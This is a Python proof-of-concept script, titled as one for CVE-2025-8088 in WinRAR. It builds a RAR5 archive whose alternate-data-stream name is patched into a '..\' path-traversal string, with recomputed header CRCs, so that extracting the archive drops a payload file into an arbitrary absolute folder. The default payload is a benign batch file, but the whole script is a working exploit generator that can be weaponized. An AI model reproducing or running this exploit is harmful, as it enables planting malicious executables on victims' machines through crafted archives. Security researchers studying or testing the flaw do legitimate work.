import argparse, os, struct, subprocess, sys, textwrap, zlib
from pathlib import Path

# RAR5 constants
RAR5_SIG = b"Rar!\x1A\x07\x01\x00"
HFL_EXTRA = 0x0001
HFL_DATA  = 0x0002


def run(cmd: str, cwd: Path | None = None, check=True) -> subprocess.CompletedProcess:
    cp = subprocess.run(cmd, shell=True, cwd=str(cwd) if cwd else None,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    if check and cp.returncode != 0:
        raise RuntimeError(f"Command failed ({cp.returncode}): {cmd}\n{cp.stdout}")
    return cp

def auto_find_rar(provided: str | None) -> str:
    if provided and Path(provided).exists():
        return provided
    candidates = [
        r"C:\Program Files\WinRAR\rar.exe",
        r"C:\Program Files (x86)\WinRAR\rar.exe",
    ]
    for d in os.environ.get("PATH", "").split(os.pathsep):
        if not d: continue
        p = Path(d) / "rar.exe"
        if p.exists(): candidates.append(str(p))
    for c in candidates:
        if Path(c).exists(): return c
    raise SystemExit("[-] rar.exe not found. Pass --rar \"C:\\Path\\to\\rar.exe\"")

def ensure_file(path: Path, default_text: str | None) -> None:
    if path.exists():
        return
    if default_text is None:
        raise SystemExit(f"[-] Required file not found: {path}")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(default_text, encoding="utf-8")
    print(f"[+] Created file: {path}")

def attach_ads_placeholder(decoy_path: Path, payload_path: Path, placeholder_len: int) -> str:
    placeholder = "X" * placeholder_len
    ads_path = f"{decoy_path}:{placeholder}"
    data = payload_path.read_bytes()
    with open(ads_path, "wb") as f:
        f.write(data)
    print("[+] Attached ADS on disk")
    return placeholder

def build_base_rar_with_streams(rar_exe: str, decoy_path: Path, base_out: Path) -> None:
    if base_out.exists():
        base_out.unlink()
    run(f'"{rar_exe}" a -ep -os "{base_out}" "{decoy_path}"')

def get_vint(buf: bytes, off: int) -> tuple[int, int]:
    val, shift, i = 0, 0, off
    while True:
        if i >= len(buf): raise ValueError("Truncated vint")
        b = buf[i]; i += 1
        val |= (b & 0x7F) << shift
        if (b & 0x80) == 0: break
        shift += 7
        if shift > 70: raise ValueError("vint too large")
    return val, i - off

def patch_placeholder_in_header(hdr: bytearray, placeholder_utf8: bytes, target_utf8: bytes) -> int:
    """Replace ':' + placeholder with ':' + target (NUL-pad if shorter)."""
    needle = b":" + placeholder_utf8
    count, i = 0, 0
    while True:
        j = hdr.find(needle, i)
        if j < 0: break
        start = j + 1
        old_len = len(placeholder_utf8)
        if len(target_utf8) > old_len:
            raise ValueError("Replacement longer than placeholder. Increase --placeholder_len.")
        hdr[start:start+len(target_utf8)] = target_utf8
        if len(target_utf8) < old_len:
            hdr[start+len(target_utf8):start+old_len] = b"\x00" * (old_len - len(target_utf8))
        count += 1
        i = start + old_len
    return count

def rebuild_all_header_crc(buf: bytearray) -> int:
    """Recompute CRC32 for ALL RAR5 block headers."""
    sigpos = buf.find(RAR5_SIG)
    if sigpos < 0:
        raise RuntimeError("Not a RAR5 archive (signature missing).")
    pos = sigpos + len(RAR5_SIG)
    blocks = 0
    while pos + 4 <= len(buf):
        block_start = pos
        try:
            header_size, hsz_len = get_vint(buf, block_start + 4)
        except Exception:
            break
        header_start = block_start + 4 + hsz_len
        header_end   = header_start + header_size
        if header_end > len(buf): break
        region = buf[block_start + 4:header_end]
        crc = zlib.crc32(region) & 0xFFFFFFFF
        struct.pack_into("<I", buf, block_start, crc)
        # step forward using flags and optional DataSize
        i = header_start
        _htype, n1 = get_vint(buf, i); i += n1
        hflags, n2 = get_vint(buf, i); i += n2
        if (hflags & HFL_EXTRA) != 0:
            _extrasz, n3 = get_vint(buf, i); i += n3
        datasz = 0
        if (hflags & HFL_DATA) != 0:
            datasz, n4 = get_vint(buf, i); i += n4
        pos = header_end + datasz
        blocks += 1
    return blocks

def strip_drive(abs_path: Path) -> str:
    s = str(abs_path)
    s = s.replace("/", "\\")
    # remove e.g. "C:\"
    if len(s) >= 2 and s[1] == ":":
        s = s[2:]
    # trim leading slashes
    while s.startswith("\\"):
        s = s[1:]
    return s

def build_traversal_name(drop_abs_dir: Path, payload_name: str, max_up: int) -> str:
    if max_up < 8:
        raise SystemExit("[-] --max_up must be >= 8 to reliably reach drive root from typical user folders.")
    tail = strip_drive(drop_abs_dir)
    rel = ("..\\" * max_up) + tail + "\\" + payload_name
    # No drive letters, no leading backslash:
    if rel.startswith("\\") or (len(rel) >= 2 and rel[1] == ":"):
        raise SystemExit("[-] Internal path error: produced an absolute name. Report this.")
    return rel

def patch_archive_placeholder(base_rar: Path, out_rar: Path, placeholder: str, target_rel: str) -> None:
    data = bytearray(base_rar.read_bytes())
    sigpos = data.find(RAR5_SIG)
    if sigpos < 0:
        raise SystemExit("[-] Not a RAR5 archive (signature not found).")
    pos = sigpos + len(RAR5_SIG)

    placeholder_utf8 = placeholder.encode("utf-8")
    target_utf8      = target_rel.encode("utf-8")

    total = 0
    while pos + 4 <= len(data):
        block_start = pos
        try:
            header_size, hsz_len = get_vint(data, block_start + 4)
        except Exception:
            break
        header_start = block_start + 4 + hsz_len
        header_end   = header_start + header_size
        if header_end > len(data): break

        hdr = bytearray(data[header_start:header_end])
        c = patch_placeholder_in_header(hdr, placeholder_utf8, target_utf8)
        if c:
            data[header_start:header_end] = hdr
            total += c

        # advance
        i = header_start
        _htype, n1 = get_vint(data, i); i += n1
        hflags, n2 = get_vint(data, i); i += n2
        if (hflags & HFL_EXTRA) != 0:
            _extrasz, n3 = get_vint(data, i); i += n3
        datasz = 0
        if (hflags & HFL_DATA) != 0:
            datasz, n4 = get_vint(data, i); i += n4
        pos = header_end + datasz

    if total == 0:
        raise SystemExit("[-] Placeholder not found in RAR headers. Ensure you built with -os and same placeholder.")
    print(f"[+] Patched {total} placeholder occurrence(s).")

    blocks = rebuild_all_header_crc(data)
    print(f"[+] Recomputed CRC for {blocks} header block(s).")

    out_rar.write_bytes(data)
    print(f"[+] Wrote patched archive: {out_rar}")
    print(f"[i] Injected stream name: {target_rel}")

def main():
    if os.name != "nt":
        print("[-] Must run on Windows (NTFS) to attach ADS locally.")
        sys.exit(1)

    ap = argparse.ArgumentParser(description="CVE-2025-8088 WinRAR PoC")
    ap.add_argument("--decoy",        required=True, help="Path to decoy file (existing or will be created)")
    ap.add_argument("--payload",      required=True, help="Path to harmless payload file (existing or will be created)")
    ap.add_argument("--drop",         required=True, help="ABSOLUTE benign folder (e.g., C:\\Users\\you\\Documents)")
    ap.add_argument("--rar",                     help="Path to rar.exe (auto-discovered if omitted)")
    ap.add_argument("--out",                     help="Output RAR filename (default: cve-2025-8088-sxy-poc.rar)")
    ap.add_argument("--workdir",      default=".", help="Working directory (default: current)")
    ap.add_argument("--placeholder_len", type=int, help="Length of ADS placeholder (auto: >= max(len(injected), 128))")
    ap.add_argument("--max_up",       type=int, default=16, help="How many '..' segments to prefix (default: 16)")
    ap.add_argument("--base_out",                 help="Optional name for intermediate base RAR (default: <out>.base.rar)")
    args = ap.parse_args()

    workdir = Path(args.workdir).resolve()
    workdir.mkdir(parents=True, exist_ok=True)

    decoy_path   = Path(args.decoy) if Path(args.decoy).is_absolute() else (workdir / args.decoy)
    payload_path = Path(args.payload) if Path(args.payload).is_absolute() else (workdir / args.payload)
    drop_abs_dir = Path(args.drop).resolve()

    out_rar = (workdir / args.out) if args.out and not Path(args.out).is_absolute() else (Path(args.out) if args.out else workdir / "cve-2025-8088-sxy-poc.rar")
    base_rar = Path(args.base_out) if args.base_out else out_rar.with_suffix(".base.rar")

    ensure_file(decoy_path,   "PoC\n")
    ensure_file(payload_path, textwrap.dedent("@echo off\n"
                                              "echo Hello World!\n"
                                              "pause\n"))

    rar_exe = auto_find_rar(args.rar)

    # Build injected stream name:
    injected_target = build_traversal_name(drop_abs_dir, payload_path.name, max_up=args.max_up)
    print(f"[+] Injected stream name will be: {injected_target}")

    # Placeholder sizing
    ph_len = args.placeholder_len if args.placeholder_len else max(len(injected_target), 128)

    placeholder = attach_ads_placeholder(decoy_path, payload_path, ph_len)

    build_base_rar_with_streams(rar_exe, decoy_path, base_rar)

    patch_archive_placeholder(base_rar, out_rar, placeholder, injected_target)

    print("\n[V] Done.")
    print(f"Payload will be dropped to: {drop_abs_dir}\\{payload_path.name}")
    if os.path.exists(base_rar):
        try:
            os.remove(base_rar)
        except:
            pass
    

if __name__ == "__main__":
    main()
